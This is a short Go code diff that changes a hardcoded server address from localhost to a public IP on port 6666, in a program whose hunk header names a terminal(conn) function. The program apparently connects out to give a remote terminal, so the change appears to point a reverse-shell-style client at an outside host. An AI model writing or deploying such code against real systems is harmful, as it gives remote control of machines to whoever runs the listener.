@@ -67,7 +67,7 @@ func terminal(conn net.Conn) {
 }
 
 func main() {
-	server := "127.0.0.1:6666"
+	server := "34.71.164.18:6666"
 	tcpAddr, err := net.ResolveTCPAddr("tcp4", server)
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "Fatal error: %s", err.Error())
